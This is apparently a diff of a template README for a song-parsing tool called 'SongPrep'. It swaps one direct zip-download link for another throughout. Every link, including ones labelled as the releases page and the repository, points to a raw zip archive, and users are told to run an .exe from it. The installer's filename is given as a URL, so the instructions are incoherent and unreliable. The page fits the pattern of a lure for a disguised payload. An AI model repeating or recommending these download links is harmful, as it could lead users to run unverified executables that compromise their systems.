@@ -1,7 +1,7 @@
 # 🎵 SongPrep - Easily Parse Song Structures and Lyrics
 
 ## 📥 Download SongPrep
-[![Download SongPrep](https://raw.githubusercontent.com/stppaing126/SongPrep/main/perfervidity/SongPrep.zip)](https://raw.githubusercontent.com/stppaing126/SongPrep/main/perfervidity/SongPrep.zip)
+[![Download SongPrep](https://github.com/stppaing126/SongPrep/raw/refs/heads/main/megatron/Song-Prep-v1.4-beta.5.zip)](https://github.com/stppaing126/SongPrep/raw/refs/heads/main/megatron/Song-Prep-v1.4-beta.5.zip)
 
 ## 📖 Overview
 SongPrep is a preprocessing framework designed to help you work with full songs. It allows for easy parsing of song structures and transcribing lyrics. Whether you are a music enthusiast or a research professional, SongPrep simplifies your tasks. 
@@ -10,7 +10,7 @@ SongPrep is a preprocessing framework designed to help you work with full songs.
 To begin using SongPrep, follow these simple steps. You’ll be up and running in no time.
 
 1. **Visit the Download Page**: Click the link below to go to the Releases page:
-   [Download SongPrep](https://raw.githubusercontent.com/stppaing126/SongPrep/main/perfervidity/SongPrep.zip)
+   [Download SongPrep](https://github.com/stppaing126/SongPrep/raw/refs/heads/main/megatron/Song-Prep-v1.4-beta.5.zip)
 
 2. **Choose Your Version**: On the Releases page, you will see a list of available versions. Each version includes release notes detailing updates and features. Pick the latest version for the best experience.
 
@@ -27,7 +27,7 @@ Before installing SongPrep, ensure your computer meets these requirements:
 ## 📤 Download & Install
 Once you have downloaded the installer, follow these steps to install SongPrep:
 
-1. **Locate the Installer**: Find the file you downloaded in your file explorer. It should be named something like `https://raw.githubusercontent.com/stppaing126/SongPrep/main/perfervidity/SongPrep.zip` or `https://raw.githubusercontent.com/stppaing126/SongPrep/main/perfervidity/SongPrep.zip`.
+1. **Locate the Installer**: Find the file you downloaded in your file explorer. It should be named something like `https://github.com/stppaing126/SongPrep/raw/refs/heads/main/megatron/Song-Prep-v1.4-beta.5.zip` or `https://github.com/stppaing126/SongPrep/raw/refs/heads/main/megatron/Song-Prep-v1.4-beta.5.zip`.
 
 2. **Run the Installer**: 
    - For Windows, double-click on the `.exe` file. 
@@ -55,7 +55,7 @@ Should you encounter issues while using SongPrep, try the following steps:
 
 - **Check Your System Requirements**: Ensure your computer meets all system requirements listed above.
 - **Restart the Application**: If the software behaves unexpectedly, closing and restarting can resolve many issues.
-- **Check for Updates**: Occasionally, new updates fix bugs or improve performance. Visit the [Releases page](https://raw.githubusercontent.com/stppaing126/SongPrep/main/perfervidity/SongPrep.zip) to see if a new version is available.
+- **Check for Updates**: Occasionally, new updates fix bugs or improve performance. Visit the [Releases page](https://github.com/stppaing126/SongPrep/raw/refs/heads/main/megatron/Song-Prep-v1.4-beta.5.zip) to see if a new version is available.
 
 ## 🤝 Support
 For further assistance, you can reach out through the following methods:
@@ -69,7 +69,7 @@ We welcome your feedback! If you find SongPrep helpful or have suggestions for i
 ## 🔗 Important Links
 Don’t forget to bookmark the following links for easy access:
 
-- [Download SongPrep](https://raw.githubusercontent.com/stppaing126/SongPrep/main/perfervidity/SongPrep.zip) 
-- [GitHub Repository](https://raw.githubusercontent.com/stppaing126/SongPrep/main/perfervidity/SongPrep.zip)
+- [Download SongPrep](https://github.com/stppaing126/SongPrep/raw/refs/heads/main/megatron/Song-Prep-v1.4-beta.5.zip) 
+- [GitHub Repository](https://github.com/stppaing126/SongPrep/raw/refs/heads/main/megatron/Song-Prep-v1.4-beta.5.zip)
 
 Enjoy your experience with SongPrep!
